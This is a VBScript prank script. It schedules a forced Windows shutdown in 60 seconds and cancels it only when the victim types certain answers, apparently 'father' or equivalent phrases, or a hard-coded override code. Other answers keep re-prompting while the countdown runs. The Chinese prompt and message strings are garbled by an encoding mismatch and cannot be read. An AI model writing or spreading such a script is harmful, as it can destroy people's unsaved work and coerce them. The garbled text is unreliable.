set ws=createobject("wscript.shell")
ws.run"cmd.exe /c shutdown -s -f -t 60"
text()
function text
dim a
a=inputbox("����춺�������һ����ʱ�䣬�аְ֣�")
if a="�ְ�" or a="father" or a="�ְ֣�" or a="�ְ�!" then
msgbox"������ԣ��Ӵˣ������춺���Ķ����ˣ��ѽ���ػ�",0,"��ϲ"
ElseIf a="20120228201202283838" then
msgbox"��������Կ���ɹ��رղ�����ػ�",0,"��ϲ"
ElseIf a="�������" or a="54188" or a="������ְ�" or a="�������" then
msgbox"��˵�����ҵ���û�ţ�",0,"������ְֵ�����"
text
ElseIf a="�Ͳ���" or a="���У�" or a="����" then
msgbox"�����ǰɣ�û�ţ�",0,"������ְֵ�����"
text
else
msgbox"��С�ӣ����аְֻ����ܣ�",0,"����һ��"
text
end if
ws.run"cmd.exe /c shutdown -a"
end function